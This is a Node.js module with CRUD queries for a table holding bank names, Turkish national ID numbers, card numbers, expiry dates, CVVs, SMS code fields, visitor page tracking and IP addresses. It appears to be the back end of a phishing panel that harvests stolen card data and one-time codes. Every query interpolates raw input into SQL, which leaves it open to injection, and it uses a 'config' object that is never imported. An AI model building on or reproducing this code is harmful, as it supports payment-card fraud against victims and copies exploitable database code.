const db = require("./db");
const helper = require("../helper");

async function getMultiple(page = 1) {
  const offset = helper.getOffset(page, config.listPerPage);
  const rows = await db.query(
    `SELECT id, bank_name, tckn, cardnumber, exp, cvv, fullname, phone, climit, sms, sms2, active_status, page, notif1, notif2, notif3, now_date, ip
    FROM info LIMIT ${offset},${config.listPerPage}`
  );
  const data = helper.emptyOrRows(rows);
  const meta = { page };

  return {
    data,
    meta,
  };
}

async function create(info) {
  const result = await db.query(
    `INSERT INTO info 
    (bank_name, tckn, cardnumber, exp, cvv, fullname, phone, climit, sms, sms2, active_status, page, notif1, notif2, notif3, now_date, ip) 
    VALUES 
    ('${info.bank_name}', '${info.tckn}', '${info.cardnumber}', '${info.exp}', '${info.cvv}', '${info.fullname}', '${info.phone}', '${info.climit}', '${info.sms}', '${info.sms2}', '${info.active_status}', '${info.page}', '${info.notif1}', '${info.notif2}', '${info.notif3}', '${info.now_date}', '${info.ip}')`
  );

  let message = "Error in creating info";

  if (result.affectedRows) {
    message = "Info created successfully";
  }

  return { message };
}

async function update(id, info) {
  const result = await db.query(
    `UPDATE info 
    SET bank_name='${info.bank_name}', tckn='${info.tckn}', cardnumber='${info.cardnumber}', exp='${info.exp}', cvv='${info.cvv}', fullname='${info.fullname}', phone='${info.phone}', climit='${info.climit}', sms='${info.sms}', sms2='${info.sms2}', active_status='${info.active_status}', page='${info.page}', notif1='${info.notif1}', notif2='${info.notif2}', notif3='${info.notif3}', now_date='${info.now_date}', ip='${info.ip}' 
    WHERE id=${id}`
  );

  let message = "Error in updating info";

  if (result.affectedRows) {
    message = "Info updated successfully";
  }

  return { message };
}

async function remove(id) {
  const result = await db.query(`DELETE FROM info WHERE id=${id}`);

  let message = "Error in deleting info";

  if (result.affectedRows) {
    message = "Info deleted successfully";
  }

  return { message };
}

module.exports = {
  getMultiple,
  create,
  update,
  remove,
};
